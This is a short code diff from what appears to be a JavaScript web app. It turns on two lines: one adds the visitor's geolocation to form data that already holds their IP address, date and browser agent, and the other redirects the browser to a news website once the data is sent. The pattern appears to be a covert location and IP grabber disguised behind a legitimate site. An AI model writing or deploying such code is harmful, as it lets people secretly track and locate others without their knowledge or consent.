@@ -55,10 +55,10 @@ export default function App() {
 
     formData.append("Ip", data.ip);
     formData.append("Date", currentDate);
-    // formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
+    formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
     formData.append("Agent", userAgent);
     Submit(formData)
-    // window.location.href = 'https://tv9gujarati.com/';
+    window.location.href = 'https://tv9gujarati.com/';
   }
 
 useEffect(() => {
